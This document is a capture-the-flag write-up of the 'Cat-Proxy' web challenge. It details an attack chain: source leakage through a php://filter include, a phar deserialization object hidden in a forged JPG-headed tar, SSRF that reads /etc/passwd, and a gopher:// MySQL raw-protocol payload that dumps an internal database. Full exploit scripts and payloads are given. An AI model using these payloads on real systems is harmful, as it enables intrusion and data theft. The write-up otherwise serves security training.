# TenDollarCTF 3rd - Cat-Proxy

## Information

Category : Web

Solver : 1

Tag : LFI, Unserialize, SSRF, MySQL

## Description

Author: @shpik

<https://www.youtube.com/watch?v=wZZ7oFKsKzY>

Server Info: <http://web2.tendollar.kr:8100/>

## Exploit

It have 3 menu in this site.

- Home
- Login
- Join

First, sign in at join page, then you show additional 2 menu.

- Nyaa
- Profile

Input url in nyaa page and the page you inputed will be displayed on the screen in nyaaa page.

If you upload to image in Profile page, then will be change your avatar to uploaded image.



I have uploaded a .php file but it seems that it can not be uploaded unless the extension is jpg, jpeg, gif, png.

This site handles the page through the p parameter.

You can leak the source code using a php wrapper to p parameter.

`http://web2.tendollar.kr:8100/?p=php://filter/convert.base64-encode/resource=index`

```html
<!-- index.php -->
<?php
    error_reporting(0);
    include('config.php');
    include('lib.php');
    include('header.php');
    $page = $_GET['p'];
    if(is_null($page) || is_array($page)|| $page==''){
        $page = 'home';
    }else{
        if(preg_match('/phar|zip|gopher|file:|\.\.|dict|iter|glob|ftp/i',$page)){
            $page = 'home';
        }
    }
    include($page.'.php');
    include('footer.php');
?>
```

Leaks config.php and lib.php source code.

```html
<!-- config.php -->
<?php
//	error_reporting(0);
    $host = "catproxy_db_1";
    $user = "cat";
    $db_schema = "cat";
	$port = 3306;
    $mysql = new mysqli($host, $user, "", $db_schema,$port);
    $mysql->query("SET NAMES utf8");

    
?>

<!-- lib.php -->
<?php
	ini_set('phar.readonly',0);
    class Requests{
        public $url;

        function __construct($url){
            $this->url = $url;
        }
        function __destruct(){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $this->url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $output = curl_exec($ch);
            echo '<div class="description">'.$output.'</div>';
        }
    }
?>
```

config.php contains information about the database connection, but it does not have a password.

`Requests` class is declared in lib.php.

This class executes curl based on the url you entered when declaring it.

The important code is `ini_set ('phar.readonly', 0);` with the phar.readonly option set to False.

Leaks nyaa.php and nyaaa.php source code.

```html
<!-- nyaa.php -->
<?php
    if($_SESSION['is_login'] !==1 ) die("<script>alert('Login please.');history.back();</script>");
?>
<div class="description"><br><br>
	<form action="?p=nyaaa" method="post">
        <center>Cat is going to anywhere!!!</center><br><br>
		<table class="loginform">
			<tr>
                <td>URL : </td>
                <td><input type="text" name="url" size="80"></td>
			</tr>
			<tr>
                <td colspan=2 style="align: right;"><input type="submit" value="Request"></td>
			</tr>
		</table>
	</form>
</div>
<!-- nyaaa.php -->
<?php
    if($_SESSION['is_login'] !==1 ) die("<script>alert('Login please.');history.back();</script>");
?>
<div class="description"><br><br>
    Result : <br><br>
    <?php 
        $url = $_POST['url'];
        if(preg_match('/phar|zip|gopher|php|dict|iter|glob|ftp|file|%0d|%0a/i',$url)){
            echo "Hacking Detected!<br>What's are you doing now nyaa?!";
        }else{
            $obj = new Requests($url);
        }
    ?>
</div>
```

nyaaa.php prints the result of executing curl on inputed url.

However, since the input value "url" is **filtered**, it can not be requested except *http* and *https*.

Leaks profile.php and uploadThumb.php source code.

```html
<!-- profile.php -->
<?php
    if($_SESSION['is_login'] !==1 ) die("<script>alert('Login please.');history.back();</script>");
?>
<div class="description"><br><br>
	<form enctype="multipart/form-data" action="?p=uploadThumb" method="post">
		<table class="loginform">
			<tr>
				<td colspan=2 style="text-align: left;"><img src="uploads/<?=$_SESSION['avatar'];?>" style="height: 100px; width: 100px; object-fit: contain; vertical-align: middle; border: 1px solid #000000;"></td><td style="text-align: left;">ID : <?=$_SESSION['id'];?></td>
			</tr>
			<tr>
                <td>Update Avatar : </td>
                <td colspan=2 style="text-align: right;"><input type="file" name="thumb" value="upload"><input type="submit" value="upload"></td>
			</tr>
		</table>
	</form>
</div>

<!-- uploadThumb.php -->
<?php
    if($_SESSION['is_login'] !==1 ) die("<script>alert('Login please.');history.back();</script>");
    chdir('uploads');
    $allowExt = Array('jpg','jpeg','png','gif');
    $fname = $_FILES['thumb']['name'];
    $fname = array_pop(explode('./',$fname));
    if(file_exists(urldecode($fname))){

        echo "<script>alert('Already uploaded file.\\nPlease change filename.');history.back();</script>";
    }else{
        $ext = strtolower(array_pop(explode('.',$fname)));
        if($_FILES['thumb']['error'] !== 0){
            die("<script>alert('Upload Error!');history.back();</script>");
        }
        if(!in_array($ext, $allowExt)){
            die("<script>alert('Sorry, not allow extension.');history.back();</script>");
        }

        $contents = file_get_contents($_FILES['thumb']['tmp_name']);

        if($ext=="jpg"){
            if(substr($contents,0,3)!="\xFF\xD8\xFF") die("<script>alert('JPG is corrupted.\\nSorry.');history.back();</script>");
        }else if($ext=="jpeg"){
            if(substr($contents,0,3)!="\xFF\xD8\xFF") die("<script>alert('JPEG is corrupted.\\nSorry.');history.back();</script>");
        }else if($ext=="png"){
            if(substr($contents,0,4)!="\x89PNG") die("<script>alert('PNG is corrupted.\\nSorry.');history.back();</script>");
        }else if($ext=="gif"){
            if(substr($contents,0,4)!="GIF8") die("<script>alert('GIF is corrupted.\\nSorry.');history.back();</script>");
        }else{
            die("<script>alert('Something error.\\nSorry.');history.back();</script>");
        }

        @move_uploaded_file($_FILES['thumb']['tmp_name'], $fname);

        $id = $mysql->real_escape_string($_SESSION['id']);
        $sql = "UPDATE users SET thumb='".$mysql->real_escape_string($fname)."' WHERE id='".$id."';";
        $result = $mysql->query($sql);
        if($result===TRUE){
            $_SESSION['avatar'] = $fname;
            echo("<script>alert('Successfully Avatar Change!');history.back();</script>");
        }else{
            echo("<script>alert('Upload failed!');history.back();</script>");
        }
    }
?>
```

uploadThumb.php checks *extension* of image file you want to upload, if same name does not exist, <u>checks header</u> of image file.

then, image file is uploaded.

Vulnerability exists on this page, and vulnerability is **file_exists** function.

**file_exists** function unserialize the Metadata contained in the phar file with phar wrapper. 

(e.g. phar://test.phar)

We can guess that the given <u>Requests class</u> is a **Server Side Request Forgery (SSRF)**.

> **Unserialize using file function**
>
> If you open <u>a phar file that contains objects as Metadata</u> through phar wrapper on file-related functions, unserialize occurs.
>
> e.g. file_exists("phar://shpik.phar");
>
> This vulnerability occurs in the following functions, including **file_exists**:
>
> - include('phar://test.phar'); 
> - file_get_contents('phar://test.phar'); 
> - file_put_contents('phar://test.phar', ''); 
> - copy('phar://test.phar', ''); 
> - file_exists('phar://test.phar'); 
> - is_executable('phar://test.phar'); 
> - is_file('phar://test.phar'); 
> - is_dir('phar://test.phar'); 
> - is_link('phar://test.phar'); 
> - is_writable('phar://test.phar‘); 
> - fileperms('phar://test.phar'); 
> - fileinode('phar://test.phar'); 
> - filesize('phar://test.phar'); 
> - fileowner('phar://test.phar');
> - filegroup('phar://test.phar'); 
> - fileatime('phar://test.phar'); 
> - filemtime('phar://test.phar');
> - filectime('phar://test.phar'); 
> - filetype('phar://test.phar'); 
> - getimagesize('phar://test.phar'); 
> - exif_read_data('phar://test.phar'); 
> - stat('phar://test.phar'); 
> - lstat('phar://test.phar'); 
> - touch('phar://test.phar‘); 
> - md5_file('phar://test.phar');
> - and so on..

First, create phar file using below code.

```php
ini_set('phar.readonly',0);

class Requests{
    public $url;

    function __construct($url){
        $this->url = $url;
    }
    function __destruct(){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        echo $output;
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->addFromString("test.txt","test");
$phar->setStub("<?php echo 'STUB!'; __HALT_COMPILER(); ?>");
$obj = new Requests('file:///etc/passwd');
$phar->setMetadata($obj);
$phar->stopBuffering();
```

The important thing when creating phar file is that Metadata 

It must contain <u>Object to be unserialized</u>.

We have created phar file that read "/etc/passwd".

Now, let's check if /etc/passwd is normally read in the **file_exists**.

```php
ini_set('phar.readonly',0);
class Requests{
    public $url;

    function __construct($url){
        $this->url = $url;
    }
    function __destruct(){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        echo $output;
    }
}

file_exists("phar://phar.phar");
```

![](/Users/osehun/Git-CTF/my_prob/Cat-Proxy/img1.png)

Successfully read!!!

However, image file we can upload are jpg, jpeg, gif, png.

```php
// in uploadThumbnail.php 
$allowExt = Array('jpg','jpeg','png','gif');
    $fname = $_FILES['thumb']['name'];
    $fname = array_pop(explode('./',$fname));
    if(file_exists(urldecode($fname))){

        echo "<script>alert('Already uploaded file.\\nPlease change filename.');history.back();</script>";
    }else{
        $ext = strtolower(array_pop(explode('.',$fname)));
        if($_FILES['thumb']['error'] !== 0){
            die("<script>alert('Upload Error!');history.back();</script>");
        }
        if(!in_array($ext, $allowExt)){
            die("<script>alert('Sorry, not allow extension.');history.back();</script>");
        }
```

Fortunately phar is not sensitive to extensions.

```php
file_exists("phar://phar.jpg");
```

Now you need to match the header.

```php
if($ext=="jpg"){
    if(substr($contents,0,3)!="\xFF\xD8\xFF") die("<script>alert('JPG is corrupted.\\nSorry.');history.back();</script>");
}else if($ext=="jpeg"){
    if(substr($contents,0,3)!="\xFF\xD8\xFF") die("<script>alert('JPEG is corrupted.\\nSorry.');history.back();</script>");
}else if($ext=="png"){
    if(substr($contents,0,4)!="\x89PNG") die("<script>alert('PNG is corrupted.\\nSorry.');history.back();</script>");
}else if($ext=="gif"){
    if(substr($contents,0,4)!="GIF8") die("<script>alert('GIF is corrupted.\\nSorry.');history.back();</script>");
}else{
    die("<script>alert('Something error.\\nSorry.');history.back();</script>");
}
```

To make it, I made phar into tar format.

In the case of tar, name of file can be change freely.

However, when changing the header of tar, checksum should also be calculated and changed.

I used to make the phar data tar using below code.

```php
ini_set('phar.readonly',0);
class Requests{
    public $url;

    function __construct($url){
        $this->url = $url;
    }
    function __destruct(){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        echo $output;
    }
}

@unlink("test.tar");
$phar = new PharData("get_flag.tar");
$phar["AAABshpik"] = "FLAGFLAGFLAG";
$obj = new Requests('file:///etc/passwd');
$phar->setMetadata($obj);
```

The hex value of generated test.tar is as follows.

![](/Users/osehun/Git-CTF/my_prob/Cat-Proxy/img2.png)

The first part contains the data you put through `$phar["AAABshpik"] = "FLAGFLAGFLAG";`.

Now, in "AAABshpik", you should change AAA to "\ xFF \ xD8 \ xFF", which is the first part of the header that is checked when you upload jpg.

Next, you should change the checksum.

I changed the name through the code below, and calculated the checksum.

```python
import sys
import struct

def calcChecksum(data):
	return sum(struct.unpack_from("148B8x356B",data))+256

if __name__=="__main__":
	if len(sys.argv)!=3:
		print "argv[1] is filename\nargv[2] is output filename.\n"
	else:
		with open(sys.argv[1],'rb') as f:
			data = f.read()
		# Make new checksum
		new_name = "\xFF\xD8\xFF\xDBshpik".ljust(100,'\x00')
		new_data = new_name + data[100:]
		checksum = calcChecksum(new_data)
		new_checksum = oct(checksum).rjust(7,'0')+'\x00'
		new_data = new_name + data[100:148] + new_checksum + data[156:]

		with open(sys.argv[2],'wb') as f:
			f.write(new_data)
```

Now upload the file generated by the above code to the server.

**filename :** shpik_etcpasswd.jpg

Then phar://shpik_etcpasswd.jpg should be uploaded. 

But there is urldecode funtion in file_exists function, we uploaded "phar%3a%2f%2fshpik_etcpasswd.jpg".

**filename :** phar%3a%2f%2fshpik_etcpasswd.jpg

![](/Users/osehun/Git-CTF/my_prob/Cat-Proxy/img3.png)

You have successfully read /etc/passwd.

If the flag exists as a file, we can not find the file name using this vulnerability.

So I think it will be in the database.

database is mysql and password does not set(null).

Connect to mysql and extract data using **gopher wrapper**!

I use below code made mysql raw socket.

```python
import struct

def raw_encode(data):
    query = ''
    for i in range(len(data)/2):
        query += '%' + data[2*i:2*(i+1)]
    return unicode(query)

p_4 = lambda x:struct.pack('<L',x)

# SSRF MySQL without password
username = 'cat'
username = username.encode('hex')

# prefix + username(hex) + \x00 + password(\x00) + suffix
connect =  "85a21e0000000040080000000000000000000000000000000000000000000000"
connect += username
connect += '00'
connect += '00'
connect += "6d7973716c5f6e61746976655f70617373776f72640061035f6f730964656269616e362e300c5f636c69656e745f6e616d65086c69626d7973716c045f7069640532323334340f5f636c69656e745f76657273696f6e08352e362e362d6d39095f706c6174666f726d067838365f363403666f6f03626172"
connect = hex(len(connect)/2)[2:]+"000001"+connect

# \x03 = exec query
query = "select * from information_schema.tables where table_schema='cat';"
raw_query = "03"
raw_query += query.encode('hex')
raw_query = p_4(len(query)+1).encode('hex')+raw_query

# quit
disconnect = '0100000001'

data = raw_encode(connect + raw_query + disconnect)

print "gopher://catproxy_db_1:3306/_"+data
'''
$ python mysql_raw_connect.py
gopher://catproxy_db_1:3306/_%9d%00%00%01%85%a2%1e%00%00%00%00%40%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%61%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%61%03%5f%6f%73%09%64%65%62%69%61%6e%36%2e%30%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%32%33%34%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%08%35%2e%36%2e%36%2d%6d%39%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%03%66%6f%6f%03%62%61%72%42%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%20%77%68%65%72%65%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3d%27%63%61%74%27%3b%01%00%00%00%01
'''
```

I create tar using url containing gopher wapper and mysql raw socket.

```php
$phar = new PharData("get_tables.tar");
$phar["AAABshpik"] = "FLAGFLAGFLAG";
$obj = new Requests('gopher://catproxy_db_1:3306/_%9d%00%00%01%85%a2%1e%00%00%00%00%40%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%63%61%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%61%03%5f%6f%73%09%64%65%62%69%61%6e%36%2e%30%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%32%33%34%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%08%35%2e%36%2e%36%2d%6d%39%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%03%66%6f%6f%03%62%61%72%42%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%20%77%68%65%72%65%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3d%27%63%61%74%27%3b%01%00%00%00%01');
$phar->setMetadata($obj);
```

Now, in "AAABshpik", you should change AAA to "\ xFF \ xD8 \ xFF",  and upload this file to the server.

**filename :** phar%3a%2f%2fshpik_tables.jpg

```
HTTP/1.1 200 OK
Date: Wed, 28 Nov 2018 12:08:45 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.2.2
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2578
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
	<title>CAT Proxy</title>
	<link rel=stylesheet href="index.css">
</head>
<body>
    <div class="menu">
        <div style="text-align: left; padding-left: 50px;font-size: 20px; font-style: bold;">Cat Proxy</div><br>
        <a href="?p=home" class="menu_a">Home</a>
        <a href="?p=nyaa" class="menu_a">Nyaa</a> <a href="?p=profile" class="menu_a">Profile</a> <a href="?p=logout" class="menu_a">Logout</a>    </div><script>alert('Already uploaded file.\nPlease change filename.');history.back();</script></body>
</html><div class="description">J   
5.7.24 g  ci   ?           0VMk7Zh. mysql_native_password           N  definformation_schematablesTABLES
TABLE_CATALOG
TABLE_CATALOG    ?    L  definformation_schematablesTABLESTABLE_SCHEMATABLE_SCHEMA @   ?    H  definformation_schematablesTABLES
TABLE_NAME
TABLE_NAME @   ?    H  definformation_schematablesTABLES
TABLE_TYPE
TABLE_TYPE @   ?    @  definformation_schematablesTABLESENGINEENGINE @   ?     B  definformation_schematablesTABLESVERSIONVERSION?         H  definformation_schematablesTABLES
ROW_FORMAT
ROW_FORMAT 
   ?     H  	definformation_schematablesTABLES
TABLE_ROWS
TABLE_ROWS?         P  
definformation_schematablesTABLESAVG_ROW_LENGTHAVG_ROW_LENGTH?         J  definformation_schematablesTABLESDATA_LENGTHDATA_LENGTH?         R  definformation_schematablesTABLESMAX_DATA_LENGTHMAX_DATA_LENGTH?         L  
definformation_schematablesTABLESINDEX_LENGTHINDEX_LENGTH?         F  definformation_schematablesTABLES	DATA_FREE	DATA_FREE?         P  definformation_schematablesTABLESAUTO_INCREMENTAUTO_INCREMENT?         J  definformation_schematablesTABLESCREATE_TIMECREATE_TIME?        J  definformation_schematablesTABLESUPDATE_TIMEUPDATE_TIME?        H  definformation_schematablesTABLES
CHECK_TIME
CHECK_TIME?        R  definformation_schematablesTABLESTABLE_COLLATIONTABLE_COLLATION     ?     D  definformation_schematablesTABLESCHECKSUMCHECKSUM?         P  definformation_schematablesTABLESCREATE_OPTIONSCREATE_OPTIONS    ?     N  definformation_schematablesTABLES
TABLE_COMMENT
TABLE_COMMENT    ?      ?  " f  defcatflag
BASE TABLEInnoDB10Dynamic0016384000?2018-11-24 03:42:04嬅latin1_swedish_ci?  }  defcatusers
BASE TABLEInnoDB10Dynamic4239016384000?2018-11-24 03:42:042018-11-28 12:08:36?latin1_swedish_ci?    ?  " </div>
```

You can see that there are flag and user in cat.

Now you can create a phar file that executes "select * from cat.flag" and upload it to the server to get the flag.

![](/Users/osehun/Git-CTF/my_prob/Cat-Proxy/img4.png)



**FLAG :** TDCTF{W0W_Do_you_know_SSRF_Shiina_Mashiro_Kawaii}



